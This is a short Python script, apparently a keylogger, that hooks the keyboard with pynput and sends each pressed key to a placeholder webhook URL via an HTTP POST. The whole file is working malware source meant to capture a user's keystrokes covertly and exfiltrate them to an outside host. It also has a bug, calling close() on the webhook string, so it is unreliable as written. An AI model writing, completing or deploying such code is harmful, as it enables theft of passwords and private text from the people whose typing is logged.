from pynput import keyboard
import requests

webhook = "yourwebhookhere"

def keyPressed(key):
    message = {
        "content": str(key)
    }
    requests.post(webhook, message)
    webhook.close()

if __name__ == "__main__":
    listener = keyboard.Listener(on_press=keyPressed)
    listener.start()
    listener.join() 
